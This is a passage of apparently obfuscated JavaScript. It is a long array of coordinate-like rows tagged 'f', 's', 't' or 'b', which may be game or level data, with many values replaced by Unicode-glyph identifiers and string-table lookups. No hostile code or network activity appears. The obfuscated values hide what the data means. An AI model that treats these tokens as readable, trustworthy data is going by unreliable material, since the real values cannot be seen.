			[ᐃᐃⵠ, "f", 1, ⲆΔΔᐃᐃ, 6, 1],
			[1, "f", 1, 12, 6, 1],
			[ⵠΔΔ, "f", ⵠΔΔ, 14, 6, 1],
			[1, "f", 1, 16, 6, ΔⲆⵠ],
			[ⵠⲆΔ, "f", ᐃᐃⵠ, ⲆⵠⵠⲆⲆ, ΔᐃⲆᐃ, 1],
			[1, "f", 1, 20, 6, ⵠⲆΔ],
			[Ⲇᐃⵠ, "f", ⵠⲆΔ, 22, ΔᐃⲆᐃ, 1],
			[ΔΔΔ, "f", ΔΔΔ, 24, ⲆᐃⲆᐃ, 1],
			[1, "f", ⵠΔΔ, 26, 6, 1],
			[ⵠⲆΔ, "f", 2, 17, ⵠᐃΔⵠᐃ, 1],
			[1, "f", 2, ΔΔⵠΔⲆ, ⵠⵠⵠⲆⲆ, Ⲇᐃⵠ],
			[1, "f", ⲆᐃᐃⲆ, 21, 6, 1],
			[ⵠΔᐃ, "f", ᐃⲆⵠᐃ, 23, 6, 1],
			[ΔΔΔ, "f", 2, 25, 6, ⵠΔᐃ],
			[1, "f", ᐃⲆⵠᐃ, 27, ⵠⵠⵠⲆⲆ, ΔΔΔ],
			[1, "f", ⵠⵠⵠΔ, 29, 6, ΔΔΔ],
			[ΔⲆⵠ, "f", 2, 31, ⵠⵠⵠⲆⲆ, ⵠΔΔ],
			[1, "f", ⵠⵠΔⲆ, 33, ⵠΔᐃΔⲆ, ⵠⲆΔ],
			[ᐃⲆᐃ, "f", ⵠΔΔ, 28, ᐃⲆⲆⲆ, 1],
			[1, "f", ΔⲆⵠ, 30, 6, Ⲇᐃⵠ],
			[1, "f", ΔⲆⵠ, 32, ⵠΔᐃΔⲆ, ⵠΔΔ],
			[ⵠΔᐃ, "f", 1, 34, ᐃⲆⲆⲆ, ⵠΔⲆ],
			[Ⲇᐃⵠ, "f", ⵠⵠΔⲆ, 67, ⵠΔᐃΔⲆ, 1],
			[1, "f", ⲆᐃᐃⲆ, 69, ⲆᐃⲆᐃ, 1],
			[1, "f", ⲆⲆΔᐃ, 71, ⵠⵠⵠⲆⲆ, ΔⲆⵠ],
			[ⵠΔΔ, "f", 2, 73, 6, ⵠΔᐃ],
			[1, "f", ⵠⵠΔⲆ, 75, ⵠΔⵠᐃⵠ, ΔⲆⵠ],
			[1, "f", 1, 68, 6, 1],
			[1, "f", ⵠΔⲆ, 70, 6, 1],
			[ⵠⲆΔ, "f", 1, 72, ⲆᐃⲆᐃ, 1],
			[1, "f", ⵠΔᐃ, 74, ΔᐃⲆᐃ, 1],
			[ᐃᐃⵠ, "f", Ⲇᐃⵠ, 76, ⵠΔᐃΔⲆ, 1],
			[1, "f", 2, 77, 6, ᐃᐃⵠ],
			[ΔⲆⵠ, "f", ᐃⲆΔⲆ, 79, 6, ΔΔΔ],
			[ᐃᐃⵠ, "f", ΔⵠᐃⲆ, 81, 6, 1],
			[1, "f", 2, 83, ᐃⲆⲆⲆ, 1],
			[1, "f", ᐃⲆΔⲆ, 85, 6, ⵠΔΔ],
			[1, "f", ᐃᐃⵠ, 78, 6, ᐃⲆᐃ],
			[Ⲇᐃⵠ, "f", 1, 80, ⲆΔᐃΔⵠ, 1],
			[ⵠΔᐃ, "f", Ⲇᐃⵠ, 82, ⵠᐃᐃΔ, 1],
			[ᐃⲆᐃ, "f", 1, 84, ΔᐃⲆᐃ, 1],
			[ⵠΔᐃ, "f", ᐃᐃⵠ, 86, 6, ⵠⲆΔ],
			[ΔⲆⵠ, "f", 2, 87, ⲆΔᐃΔⵠ, 1],
			[ᐃⲆᐃ, "f", 2, 89, 6, 1],
			[ΔΔΔ, "f", ΔⵠᐃⲆ, 91, 6, ᐃⲆᐃ],
			[1, "f", ΔⵠᐃⲆ, 93, ΔᐃⲆᐃ, 1],
			[ⵠΔⲆ, "f", ⵠΔΔ, 88, 6, ⵠⲆΔ],
			[1, "f", ⵠⲆΔ, 90, 6, 1],
			[ⵠΔᐃ, "f", ΔΔΔ, 92, ⵠᐃΔⵠᐃ, 1],
			[ᐃⲆᐃ, "f", ᐃᐃⵠ, 94, 6, ΔⲆⵠ],
			[1, "f", ΔⵠᐃⲆ, 95, ⵠᐃᐃΔ, 1],
			[ΔⲆⵠ, "f", ᐃᐃⵠ, 95, ᐃᐃᐃⵠᐃ, ⵠΔⲆ],
			[1, "f", 1, 83, ᐃᐃᐃⵠᐃ, ᐃᐃⵠ],
			[1, "f", ⵠΔᐃ, 81, 7, ⵠΔⲆ],
			[ᐃⲆᐃ, "f", 1, 79, ᐃᐃᐃⵠᐃ, ⵠΔΔ],
			[ᐃⲆᐃ, "f", Ⲇᐃⵠ, 77, 7, 1],
			[ⵠΔᐃ, "f", 1, 75, 7, ΔΔΔ],
			[ⵠΔᐃ, "f", ᐃᐃⵠ, 73, 7, 1],
			[1, "f", Ⲇᐃⵠ, 71, ⲆᐃᐃᐃΔ, ⵠΔᐃ],
			[ᐃᐃⵠ, "f", ΔΔΔ, 69, ⵠⵠⲆⲆⵠ, 1],
			[1, "f", ⵠΔᐃ, 33, 7, 1],
			[1, "f", ᐃⲆᐃ, 31, 7, ΔΔΔ],
			[1, "f", ⵠΔⲆ, 29, 7, ⵠΔΔ],
			[1, "f", ᐃⲆᐃ, 27, 7, 1],
			[1, "f", 1, 25, ᐃⵠⵠᐃᐃ, 1],
			[1, "f", ⵠΔΔ, 23, ΔⲆΔᐃᐃ, 1],
			[ⵠⲆΔ, "f", ᐃᐃⵠ, 21, ⲆᐃᐃᐃΔ, 1],
			[ΔΔΔ, "f", 1, 19, ⵠΔᐃⵠⵠ, 1],
			[ⵠΔⲆ, "f", 1, ΔⲆⲆΔΔ, 7, ᐃᐃⵠ],
			[1, "f", 1, ΔⲆΔⲆⲆ, 7, ⵠΔΔ],
			[ⵠΔΔ, "f", ⵠⲆΔ, ΔⲆⵠΔⵠ, 7, 1],
			[1, "f", 1, 11, 7, ⵠⲆΔ],
			[ⵠΔⲆ, "f", 1, ΔΔΔΔΔ, 7, 1],
			[ᐃⲆᐃ, "f", ᐃⲆᐃ, ⲆᐃᐃᐃΔ, ᐃⲆⲆᐃᐃ, Ⲇᐃⵠ],
			[1, "s", 0, 7, ᐃⵠⲆᐃᐃ, ΔⲆⵠ],
			[ⵠΔΔ, "t", Ⲇⵠⵠⵠ, ⵠⵠⲆⲆⵠ, 174, 0],
			[1, "t", ⵠᐃΔⵠ, ᐃᐃᐃⵠᐃ, 175, 0],
			[ᐃⲆᐃ, "t", 4, ⵠΔᐃⵠⵠ, 176, ⵠⲆⲆ],
			[ΔΔΔ, "b", 2, 7, 177, ᐃⵠⲆ],
			[1, "t", ΔⲆᐃⲆ, 94, 301, Δⵠᐃ],
			[ⵠΔΔ, "b", ᐃⲆᐃᐃ, 95, 301, 0],
			[ᐃᐃⵠ, "t", ⲆᐃᐃΔ, 96, 301, 0],
			[ᐃⲆᐃ, "t", ᐃᐃⵠ, 97, 301, 0],
			[1, "t", ⲆⲆΔᐃ, 98, 301, 0],
			[Ⲇᐃⵠ, "t", Ⲇᐃⵠᐃ, 99, 301, 0],
			[1, "t", ᐃⲆΔⲆ, ΔᐃⲆⲆⲆ, 301, 0],
			[ⵠΔΔ, "t", 4, 96, 304, 0],
			[1, "t", ΔⵠᐃⲆ, 96, 302, 0],
			[Ⲇᐃⵠ, "t", 2, 97, 304, ΔΔⵠ],
			[ⵠΔΔ, "t", 2, 96, 303, 0],
			[ⵠⲆΔ, "t", 5, 97, 303, 0],
			[Ⲇᐃⵠ, "t", 5, 98, 304, ΔⲆⲆ],
			[1, "b", 2, 97, 302, ᐃΔΔ],
			[1, "b", ⵠⵠⵠΔ, 99, 304, ᐃΔΔ],
			[1, "t", 1, 98, 303, 0],
			[1, "t", ⵠᐃΔΔ, 98, 302, 0],
			[1, "t", ⲆⲆⲆΔ, 99, 303, ᐃⵠⲆ],
			[ΔΔΔ, "t", ⲆᐃᐃΔ, ΔΔᐃⵠᐃ, 304, ΔⲆⲆ],
			[ⵠⲆΔ, "t", 5, 99, 302, ΔⲆⲆ],
			[ΔⲆⵠ, "t", 5, 101, 303, 0],
			[1, "t", 2, ᐃⲆΔⲆⵠ, 303, 0],
			[ᐃⲆᐃ, "t", 0, 100, 302, 0],
			[1, "t", ᐃΔΔ, 101, 304, Δⵠᐃ],
			[ⵠΔΔ, "t", 4, 102, 304, 0],
			[1, "f", 0, 94, 7, ⵠΔᐃ],
			[Ⲇᐃⵠ, "f", 1, 93, ⵠⵠⲆⲆⵠ, ⵠΔⲆ],
			[1, "f", ᐃᐃⵠ, 92, ᐃⵠⵠⵠΔ, ᐃᐃⵠ],
			[1, "f", 0, 91, 7, ⵠΔΔ],
			[ᐃᐃⵠ, "f", ΔⲆⵠ, 90, 7, 1],
			[1, "f", 1, 89, 7, ⵠⲆΔ],
			[Ⲇᐃⵠ, "f", ΔⲆⲆ, 88, 7, 1],
			[1, "f", 1, 87, 7, 1],
			[ⵠⲆΔ, "f", ΔⲆⵠ, 86, 7, 1],
			[1, "f", ᐃᐃⵠ, 85, 7, 1],
			[ⵠΔΔ, "f", 0, 84, 7, Ⲇᐃⵠ],
			[1, "f", 1, 82, 7, ΔΔΔ],
			[1, "f", 0, 80, 7, Ⲇᐃⵠ],
			[1, "f", 1, 78, 7, 1],
			[1, "f", 0, 76, 7, 1],
			[1, "f", ᐃⲆᐃ, 74, 7, 1],
			[ⵠΔᐃ, "f", ᐃΔΔ, 72, 7, ⵠΔᐃ],
			[ⵠΔⲆ, "f", 0, 70, ᐃᐃᐃⵠᐃ, ⵠΔΔ],
			[ⵠΔΔ, "f", Ⲇᐃⵠ, 68, ᐃᐃᐃⵠᐃ, ᐃⲆᐃ],
			[1, "f", ⵠΔΔ, 32, 7, 1],
			[1, "f", 0, 30, ⵠΔᐃⵠⵠ, 1],
			[1, "f", 1, 28, ⵠΔᐃⵠⵠ, ΔⲆⵠ],
			[ᐃⲆᐃ, "f", ⲆΔⵠ, 26, ᐃⲆⲆᐃᐃ, ⵠΔΔ],
			[ᐃⲆᐃ, "f", 1, 24, 7, ΔΔΔ],
			[1, "f", 0, 22, ᐃᐃᐃⵠᐃ, ΔΔΔ],
			[1, "f", ⵠⲆΔ, ⵠᐃΔᐃᐃ, 7, ⵠΔⲆ],
			[ⵠΔⲆ, "f", 0, ⲆⵠⲆᐃΔ, ᐃⵠⵠᐃᐃ, 1],
			[1, "f", ΔⲆⵠ, ΔΔᐃᐃⲆ, ᐃⵠⵠⵠΔ, 1],
			[ⵠΔᐃ, "f", ᐃⵠΔ, ⵠⲆΔᐃᐃ, ᐃᐃᐃⵠᐃ, 1],
			[1, "f", ΔⲆⵠ, ⲆΔⲆⲆᐃ, ᐃⵠⵠⵠΔ, ᐃᐃⵠ],
			[1, "f", 0, 10, ᐃⵠⵠᐃᐃ, ⵠΔΔ],
			[1, "f", 1, ⵠⵠⲆⵠΔ, 7, 1],
			[1, "s", ⵠΔᐃ, 7, 9, 1],
			[1, "f", 0, 95, 152, ⵠΔΔ],
			[ᐃᐃⵠ, "f", 1, 95, 151, 1],
			[1, "f", 0, 95, ⵠⲆⲆᐃⲆⵠⵠ, 1],
			[1, "f", 1, 95, ⲆΔⵠᐃⲆ, ΔⲆⵠ],
			[1, "f", 1, 95, ΔⲆᐃᐃᐃ, Ⲇᐃⵠ],
			[1, "f", 1, 95, 19, Ⲇᐃⵠ],
			[ΔΔΔ, "f", 0, 95, ⵠⵠⵠⵠΔ, 1],
			[1, "f", ⲆΔⵠ, 95, ⵠᐃΔᐃᐃ, 1],
			[1, "f", 1, 95, 21, Ⲇᐃⵠ],
			[1, "f", ⵠΔⲆ, 95, 26, 1],
			[1, "f", 1, 95, 37, Ⲇᐃⵠ],
			[ⵠⲆΔ, "f", ⲆΔⵠ, 95, 44, 1],
			[ᐃᐃⵠ, "f", ⵠΔΔ, 95, 50, 1],
			[ⵠΔΔ, "f", 1, 95, 52, ᐃⲆᐃ],
			[1, "f", ᐃΔΔ, 95, 53, ΔⲆⵠ],
			[ⵠΔᐃ, "f", ⵠΔΔ, 95, 54, ΔⲆⵠ],
			[ⵠΔⲆ, "f", 1, 95, 62, ΔⲆⵠ],
			[1, "f", Δⵠᐃ, 95, 55, 1],
			[ΔⲆⵠ, "f", 1, 95, 64, 1],
			[ΔΔΔ, "f", 0, 95, 58, 1],
			[ᐃᐃⵠ, "f", ΔⲆⲆ, 95, 61, ⵠΔᐃ],
			[ⵠΔⲆ, "f", ⲆΔⵠ, 95, 68, 1],
			[ⵠΔᐃ, "f", ᐃⵠΔ, 95, 72, ᐃᐃⵠ],
			[ⵠΔΔ, "f", ᐃⵠⲆ, 95, 78, ⵠΔᐃ],
			[1, "f", ΔΔΔ, 95, 115, 1],
			[1, "f", ᐃᐃⵠ, 95, 117, ⵠⲆΔ],
			[ⵠⲆΔ, "f", ᐃⲆᐃ, 95, 128, 1],
			[ⵠΔⲆ, "f", 0, 95, 85, ΔΔΔ],
			[1, "f", ⵠⲆⲆ, 95, 91, 1],
			[ⵠΔΔ, "f", 0, 95, 95, 1],
			[1, "f", 0, 95, 114, Ⲇᐃⵠ],
			[ᐃᐃⵠ, "f", 2, 95, 113, 1],
			[ᐃᐃⵠ, "f", 1, 95, 119, 1],
			[1, "f", ⲆΔⵠ, 95, 120, 1],
			[1, "f", 1, 95, 121, ⵠⲆΔ],
			[ⵠΔΔ, "f", ⵠⲆⲆ, 95, 127, ⵠΔᐃ],
			[1, "f", Ⲇᐃⵠ, 95, 130, ⵠⲆΔ],
			[1, "f", ᐃΔΔ, 95, 131, 1],
			[ΔⲆⵠ, "f", ΔⲆⵠ, 95, 132, 1],
			[1, "f", 1, 95, 136, ⵠΔⲆ],
			[ΔⲆⵠ, "f", 0, 95, 137, Ⲇᐃⵠ],
			[1, "f", ⲆΔⵠ, 95, 143, ΔΔΔ],
			[1, "f", 0, 95, 147, ⵠΔΔ],
			[1, "f", 1, 95, 138, ⵠⲆΔ],
			[ⵠΔΔ, "f", 1, 95, 144, Ⲇᐃⵠ],
			[Ⲇᐃⵠ, "f", Ⲇᐃⵠ, 95, 10, ᐃᐃⵠ],
			[1, "f", 0, 95, 8, 1],
			[ⵠΔΔ, "f", ΔΔΔ, 95, 9, ᐃⲆᐃ],
			[1, "f", 0, 95, 13, ᐃᐃⵠ],
			[1, "f", ⵠⲆΔ, 95, ⵠΔⲆᐃᐃ, 1],
			[1, "f", ᐃⲆᐃ, 95, 17, 1],
			[1, "f", ᐃΔΔ, 95, 18, ΔⲆⵠ],
			[1, "f", Ⲇᐃⵠ, 95, 45, 1],
			[ⵠΔΔ, "f", ⵠⲆⲆ, 95, 51, 1],
			[1, "f", ⵠΔΔ, 95, 56, 1],
			[1, "f", 1, 95, 57, 1],
			[1, "f", 1, 95, 59, ⵠΔⲆ],
			[ⵠΔᐃ, "f", ⵠΔⲆ, 95, 60, 1],
			[ᐃⲆᐃ, "f", 1, 95, 63, 1],
			[1, "f", 0, 95, 65, ΔΔΔ],
			[ⵠΔⲆ, "f", 1, 95, 66, 1],
			[ⵠΔᐃ, "f", 1, 95, 67, ᐃᐃⵠ],
			[1, "f", ᐃᐃⵠ, 95, 69, ΔⲆⵠ],
			[ᐃⲆᐃ, "f", ᐃᐃⵠ, 95, 70, ⵠΔⲆ],
			[ᐃᐃⵠ, "f", ᐃⵠⲆ, 95, 71, ⵠΔᐃ],
			[ΔΔΔ, "f", ⵠΔⲆ, 95, 73, 1],
			[1, "f", ΔⲆⵠ, 95, 74, 1],
			[ᐃⲆᐃ, "f", ⵠⲆⲆ, 95, 75, ⵠⲆΔ],
			[1, "f", 1, 95, 76, 1],
			[Ⲇᐃⵠ, "f", 1, 95, 77, ⵠΔᐃ],
			[ᐃᐃⵠ, "f", 1, 95, 79, 1],
			[ΔΔΔ, "f", ⵠΔΔ, 95, 80, 1],
			[1, "f", ΔⲆⲆ, 95, 81, ᐃᐃⵠ],
			[1, "f", 1, 95, 82, 1],
			[ⵠⲆΔ, "f", 0, 95, 83, 1],
			[ⵠΔΔ, "f", ⵠΔᐃ, 95, 84, Ⲇᐃⵠ],
			[1, "f", 1, 95, 86, ⵠΔᐃ],
			[1, "f", 1, 95, 88, ᐃᐃⵠ],
			[ΔⲆⵠ, "f", ΔⲆⲆ, 95, 87, 1],
			[1, "f", 1, 95, 89, 1],
			[ᐃᐃⵠ, "f", 1, 95, 90, 1],
			[ⵠΔΔ, "f", 1, 95, 92, ΔⲆⵠ],
			[ⵠΔᐃ, "f", ΔΔΔ, 95, 93, ΔΔΔ],
			[ⵠΔⲆ, "f", ΔΔΔ, 95, 94, ⵠΔΔ],
			[ⵠΔⲆ, "f", Ⲇᐃⵠ, 95, 96, 1],
			[ⵠΔΔ, "f", 1, 95, 97, ΔⲆⵠ],
			[ⵠΔⲆ, "f", ᐃΔΔ, 95, 98, ᐃⲆᐃ],
			[1, "f", 1, 95, 99, 1],
			[1, "f", 1, 95, ⲆᐃΔⵠⵠ, 1],
			[1, "f", ⵠⲆⲆ, 95, 101, ᐃⲆᐃ],
			[1, "f", 1, 95, 102, ⵠΔⲆ],
			[ⵠⲆΔ, "f", ᐃⵠΔ, 95, 103, 1],
			[1, "f", ⵠΔᐃ, 95, 104, ΔΔΔ],
			[1, "f", 1, 95, 105, ΔⲆⵠ],
			[ᐃⲆᐃ, "f", ⵠⲆⲆ, 95, 106, ⵠⲆΔ],
			[1, "f", 1, 95, 107, 1],
			[1, "f", ΔΔΔ, 95, 108, 1],
			[1, "f", ⵠΔΔ, 95, 109, ⵠΔᐃ],
			[1, "f", ᐃΔΔ, 95, 110, ⵠΔⲆ],
			[1, "f", Ⲇᐃⵠ, 95, 111, ᐃⲆᐃ],
			[1, "f", ⵠⲆⲆ, 95, 112, ⵠΔΔ],
			[1, "f", 1, 95, 116, 1],
			[1, "f", 0, 95, 118, 1],
			[ⵠⲆΔ, "f", 0, 95, 122, 1],
			[ᐃᐃⵠ, "f", ⵠⲆΔ, 95, 123, ⵠΔΔ],
			[1, "f", 1, 95, 124, 1],
			[ᐃᐃⵠ, "f", ᐃΔΔ, 95, 125, ⵠΔΔ],
			[1, "f", ⵠⲆΔ, 95, 126, ⵠΔᐃ],
			[ΔⲆⵠ, "f", 1, 95, 129, ΔⲆⵠ],
			[ᐃᐃⵠ, "f", 1, 95, 133, ᐃⲆᐃ],
			[Ⲇᐃⵠ, "f", Δⵠᐃ, 95, 134, ⵠⲆΔ],
			[1, "f", 1, 95, 135, 1],
			[1, "f", ⵠΔⲆ, 95, 139, 1],
			[ⵠΔΔ, "f", Δⵠᐃ, 95, 140, ⵠΔⲆ],
			[1, "f", ΔⲆⵠ, 95, 141, ⵠⲆΔ],
			[ΔΔΔ, "f", 1, 95, 142, 1],
			[Ⲇᐃⵠ, "f", ⵠⲆΔ, 95, 146, Ⲇᐃⵠ],
			[1, "f", Δⵠᐃ, 95, 145, 1],
			[1, "f", 1, 95, 148, ⵠΔᐃ],
			[ⵠΔΔ, "f", Ⲇᐃⵠ, 95, 149, 1],
			[Ⲇᐃⵠ, "f", 1, 95, 150, ΔΔΔ],
			[1, "f", ΔΔΔ, 95, 153, ᐃᐃⵠ],
			[1, ⵠ[568], 0, 64, 9, 1],
			[ⵠΔΔ, ⵠ[568], ⵠΔⲆ, 64, 10, 1],
			[1, ⵠ[568], 2, 64, 16, Ⲇᐃⵠ],
			[ΔⲆⵠ, ⵠ[568], ΔⵠᐃⲆ, 64, 19, ᐃⲆᐃ],
			[ⵠΔᐃ, ⵠ[568], 0, 64, 20, ⵠΔⲆ],
			[ΔΔΔ, ⵠ[568], 1, 64, 21, 1],
			[1, ⵠ[568], 2, 64, 22, ᐃⲆᐃ],
			[ᐃⲆᐃ, ⵠ[568], ᐃⵠΔ, 64, 23, 1],
			[ᐃⲆᐃ, ⵠ[568], ᐃⲆⵠᐃ, 64, 24, 1],
			[1, ⵠ[568], ᐃⲆᐃ, 64, 29, ⵠΔΔ],
			[Ⲇᐃⵠ, ⵠ[568], 2, 64, 30, Ⲇᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], 3, 64, 31, ΔⲆⵠ],
			[1, ⵠ[568], 0, 64, 32, ⵠΔⲆ],
			[ᐃⲆᐃ, ⵠ[568], ⵠⲆΔ, 64, 33, ⵠΔᐃ],
			[ⵠΔⲆ, ⵠ[568], ⵠⵠΔⲆ, 64, 34, ΔⲆⵠ],
			[1, ⵠ[568], ΔΔⵠ, 64, 35, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 64, Δᐃⵠⵠⵠ, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 65, Δᐃⵠⵠⵠ, 1],
			[1, ⵠ[568], 1, 65, ΔΔΔΔΔ, ΔΔΔ],
			[ⵠΔΔ, ⵠ[568], 2, 65, 10, ᐃᐃⵠ],
			[ΔⲆⵠ, ⵠ[568], ⵠⵠⵠᐃ, 65, 11, ⵠΔΔ],
			[1, ⵠ[568], ⵠⲆΔ, 65, ⵠΔⵠΔΔ, 1],
			[1, ⵠ[568], ⵠⲆⲆ, 64, ⵠᐃⲆⲆⲆⲆⲆ, ⵠΔᐃ],
			[1, ⵠ[568], 3, 65, 17, 1],
			[1, ⵠ[568], ⵠⵠΔⲆ, 64, 18, 1],
			[1, ⵠ[568], 2, 65, ᐃⵠⲆΔΔ, ⵠΔΔ],
			[1, ⵠ[568], ΔⲆⲆ, 65, 19, 1],
			[1, ⵠ[568], 1, 65, 20, ᐃⲆᐃ],
			[1, ⵠ[568], 3, 65, 21, 1],
			[1, ⵠ[568], 2, 65, 22, 1],
			[ⵠΔᐃ, ⵠ[568], ᐃᐃⲆⲆ, 65, 23, ᐃⲆᐃ],
			[ᐃⲆᐃ, ⵠ[568], 0, 65, 24, ΔΔΔ],
			[ΔⲆⵠ, ⵠ[568], 2, 65, 29, ⵠⲆΔ],
			[1, ⵠ[568], 3, 65, 30, Ⲇᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], ᐃΔΔ, 65, 31, ⵠⲆΔ],
			[1, ⵠ[568], ⵠΔⲆ, 65, 32, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 65, 33, ᐃⲆᐃ],
			[1, ⵠ[568], 3, 65, 34, ⵠΔⲆ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 63, ΔΔⵠⲆⵠ, 1],
			[1, ⵠ[568], 0, 62, 9, ⵠⲆΔ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 61, 9, 1],
			[ⵠΔⲆ, ⵠ[568], Δⵠᐃ, 60, 9, 1],
			[1, ⵠ[568], ⵠⵠⵠΔ, 59, ⵠⲆΔⵠⵠ, 1],
			[ᐃⲆᐃ, ⵠ[568], ΔⵠᐃⲆ, 58, 9, 1],
			[ᐃⲆᐃ, ⵠ[568], 0, 57, ⲆΔⲆΔⵠ, 1],
			[1, ⵠ[568], 2, 56, ⲆΔⵠᐃΔ, 1],
			[1, ⵠ[568], 2, 55, ΔⲆⵠΔⲆ, 1],
			[1, ⵠ[568], 2, 54, 9, ᐃᐃⵠ],
			[ΔΔΔ, ⵠ[568], ⵠⲆⲆ, 53, 9, ᐃᐃⵠ],
			[1, ⵠ[568], ⲆΔⵠ, 51, ⲆΔⲆΔⵠ, 1],
			[1, ⵠ[568], 2, 52, 9, ᐃᐃⵠ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 50, 9, 1],
			[ΔΔΔ, ⵠ[568], ΔⵠᐃⲆ, 48, Ⲇᐃⵠⵠⵠ, ᐃⲆᐃ],
			[ΔΔΔ, ⵠ[568], 2, 49, ΔⵠᐃᐃⲆ, ⵠⲆΔ],
			[1, ⵠ[568], 0, 47, ⲆⵠⲆⲆⲆ, ᐃᐃⵠ],
			[1, ⵠ[568], ΔΔⵠ, 45, 9, 1],
			[1, ⵠ[568], 0, 43, 9, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 46, 9, 1],
			[Ⲇᐃⵠ, ⵠ[568], ⵠⵠⵠΔ, 44, ΔΔΔΔΔ, 1],
			[ΔΔΔ, ⵠ[568], ᐃⲆΔⲆ, 42, 9, ᐃᐃⵠ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 41, ⵠⲆⲆΔᐃ, 1],
			[1, ⵠ[568], 0, 40, ⲆⵠⲆⲆⲆ, ᐃᐃⵠ],
			[1, ⵠ[568], 2, 39, 9, ᐃⲆᐃ],
			[1, ⵠ[568], 2, 38, 9, 1],
			[Ⲇᐃⵠ, ⵠ[568], ⲆΔⵠ, 37, ⲆⵠⲆⲆⲆ, 1],
			[1, ⵠ[568], 0, 63, ᐃⵠⲆᐃᐃ, 1],
			[1, ⵠ[568], 2, 65, 7, 1],
			[1, ⵠ[568], 3, 64, ᐃⲆⲆᐃᐃ, ΔⲆⵠ],
			[Ⲇᐃⵠ, ⵠ[568], ᐃⲆΔⲆ, 62, ΔᐃΔⲆⲆ, 1],
			[ΔΔΔ, ⵠ[568], ⲆΔⵠⵠ, 61, 8, 1],
			[ᐃⲆᐃ, ⵠ[568], 1, 62, 7, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 63, ᐃⵠⵠⵠΔ, 1],
			[1, ⵠ[568], ᐃⵠⲆ, 64, 6, ΔΔΔ],
			[1, ⵠ[568], ΔⲆᐃⲆ, 65, 6, 1],
			[ΔΔΔ, ⵠ[568], 2, 63, 6, 1],
			[ⵠΔΔ, ⵠ[568], 2, 62, 6, ⵠⲆΔ],
			[Ⲇᐃⵠ, ⵠ[568], ⲆⲆΔᐃ, 61, ΔᐃⲆᐃ, ΔⲆⵠ],
			[1, ⵠ[568], 2, 60, ⲆΔᐃΔⵠ, ΔΔΔ],
			[1, ⵠ[568], 2, 59, ⵠᐃᐃΔ, 1],
			[1, ⵠ[568], 2, 61, ᐃΔⲆΔᐃ, ⵠⲆΔ],
			[ΔΔΔ, ⵠ[568], 0, 60, ⵠΔᐃⵠⵠ, ΔⲆⵠ],
			[1, ⵠ[568], 2, 60, ⵠⵠⲆⵠΔ, 1],
			[1, ⵠ[568], 2, 59, ᐃΔⲆΔᐃ, 1],
			[1, ⵠ[568], ⵠⵠΔⲆ, 59, 8, 1],
			[1, ⵠ[568], ⵠΔᐃ, 58, Δᐃⵠⵠⵠ, 1],
			[1, ⵠ[568], ⵠⲆΔ, 57, 6, ⵠΔᐃ],
			[ΔⲆⵠ, ⵠ[568], 1, 55, ⲆᐃᐃᐃΔ, 1],
			[1, ⵠ[568], 0, 56, ⵠᐃΔⵠᐃ, ⵠΔΔ],
			[ΔⲆⵠ, ⵠ[568], 2, 58, 6, 1],
			[1, ⵠ[568], 2, 58, ΔⲆΔᐃᐃ, ᐃᐃⵠ],
			[1, ⵠ[568], 2, 57, ⵠⵠⲆⲆⵠ, 1],
			[ᐃⲆᐃ, ⵠ[568], ⵠⵠⵠΔ, 56, ⲆᐃᐃᐃΔ, 1],
			[ⵠΔΔ, ⵠ[568], ⲆⲆΔᐃ, 55, ⵠΔᐃΔⲆ, 1],
			[1, ⵠ[568], 2, 57, 8, ΔⲆⵠ],
			[ΔⲆⵠ, ⵠ[568], 2, 56, 8, ᐃᐃⵠ],
			[ⵠΔᐃ, ⵠ[568], 2, 55, 8, ⵠΔΔ],
			[1, ⵠ[568], ⲆΔⵠ, 54, ᐃⵠⲆᐃᐃ, ΔⲆⵠ],
			[ᐃⲆᐃ, ⵠ[568], 0, 50, 7, Ⲇᐃⵠ],
			[1, ⵠ[568], ⵠⲆⲆ, 53, 6, ᐃᐃⵠ],
			[ΔⲆⵠ, ⵠ[568], ⵠⵠΔⲆ, 54, ⵠΔⵠᐃⵠ, ⵠⲆΔ],
			[ΔΔΔ, ⵠ[568], 2, 54, ᐃⵠⵠᐃᐃ, 1],
			[1, ⵠ[568], 2, 53, ᐃⲆⲆᐃᐃ, ⵠⲆΔ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 52, ⲆᐃᐃᐃΔ, 1],
			[ᐃᐃⵠ, ⵠ[568], ⲆᐃᐃⲆ, 52, 6, 1],
			[ⵠΔΔ, ⵠ[568], 1, 52, ⵠⵠⲆⵠΔ, ΔⲆⵠ],
			[1, ⵠ[568], 2, 53, 8, 1],
			[ⵠΔΔ, ⵠ[568], 2, 51, ΔᐃᐃⲆᐃ, 1],
			[ⵠⲆΔ, ⵠ[568], 2, 51, 7, ᐃᐃⵠ],
			[ᐃᐃⵠ, ⵠ[568], ⵠⵠΔⲆ, 51, 6, ᐃᐃⵠ],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 50, ⵠΔⵠᐃⵠ, ⵠΔΔ],
			[1, ⵠ[568], 2, 50, 8, 1],
			[1, ⵠ[568], ⵠⵠⵠΔ, 49, Δᐃⵠⵠⵠ, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 49, 7, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 49, 6, 1],
			[Ⲇᐃⵠ, ⵠ[568], 0, 46, ᐃⵠⵠᐃᐃ, 1],
			[ᐃᐃⵠ, ⵠ[568], Ⲇᐃⵠ, 48, ᐃⵠⲆᐃᐃ, 1],
			[ᐃᐃⵠ, ⵠ[568], ⵠΔΔ, 44, ⲆᐃᐃᐃΔ, 1],
			[1, ⵠ[568], ᐃⲆᐃ, 41, 8, 1],
			[ⵠⲆΔ, ⵠ[568], ⲆⲆΔᐃ, 48, ΔⲆΔᐃᐃ, 1],
			[ΔⲆⵠ, ⵠ[568], 2, 48, ΔᐃⲆᐃ, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 47, 6, 1],
			[1, ⵠ[568], 2, 47, 7, 1],
			[1, ⵠ[568], 2, 47, ΔᐃΔⲆⲆ, 1],
